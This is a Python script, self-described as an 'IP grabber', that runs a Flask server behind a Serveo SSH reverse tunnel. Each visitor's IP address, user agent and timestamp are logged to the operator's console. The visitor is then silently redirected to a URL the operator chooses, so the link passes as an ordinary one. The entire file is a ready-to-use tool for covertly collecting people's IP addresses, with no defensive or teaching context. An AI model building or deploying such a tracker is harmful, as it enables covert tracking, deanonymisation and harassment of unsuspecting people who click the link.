import os
import subprocess
import time
from flask import Flask, request, redirect
from datetime import datetime
import threading

banner = """\033[091m
    ________                      __    __             
   /  _/ __ \   ____ __________ _/ /_  / /_  ___  _____
   / // /_/ /  / __ `/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
 _/ // ____/  / /_/ / /  / /_/ / /_/ / /_/ /  __/ /    
/___/_/       \__, /_/   \__,_/_.___/_.___/\___/_/     
             /____/                                    
 \033[0m"""

class ipgrabber:
    def __init__(self):
        self.app = Flask(__name__)
        self.redirect_url = self.get_redirect_url()

        @self.app.route("/")
        def log_ip():
            visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
            user_agent = request.headers.get('User-Agent')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            print("\033[95m📥 New Visitor Logged:\033[0m")
            print(f"\033[91mIP Address    : {visitor_ip}\033[0m")
            print(f"\033[95mUser-Agent    : {user_agent}\033[0m")
            print(f"\033[95mTimestamp     : {timestamp}\033[0m")

            return redirect(self.redirect_url)

    def get_redirect_url(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        url = input("🔗 Enter the URL to redirect users to: ").strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        return url

    def start_serveo_tunnel(self):
        print("🌐 Starting Serveo tunnel (ssh to serveo.net)...")
        try:
            serveo_cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:5000", "serveo.net"]
            subprocess.Popen(serveo_cmd)
            time.sleep(3)
            print("🔗 Serveo tunnel running! Use the forwarded URL shown in your terminal (e.g., https://yourname.serveo.net)")
        except Exception as e:
            print("❌ Error starting Serveo tunnel:", e)

    def start(self):
        threading.Thread(target=self.start_serveo_tunnel, daemon=True).start()
        self.app.run(host="0.0.0.0", port=5000)

if __name__ == "__main__":
    ipgrabber_instance = ipgrabber()
    ipgrabber_instance.start()
